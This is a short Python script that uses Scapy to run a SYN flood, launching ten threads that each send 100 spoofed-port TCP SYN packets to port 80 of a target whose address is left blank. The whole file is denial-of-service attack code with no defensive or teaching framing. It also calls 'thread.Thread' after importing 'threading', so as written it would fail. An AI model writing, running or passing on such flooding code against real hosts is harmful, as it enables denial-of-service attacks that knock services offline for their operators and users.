#!/usr/bin/env python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import threading

target = ""
port = 80

def flood():
	for x in range(100):
		send(IP(dst=target)/TCP(sport=RandShort(), dport=port, flags="S"), verbose=0)
		
for i in range(10):
	thread.Thread(target=flood).start()

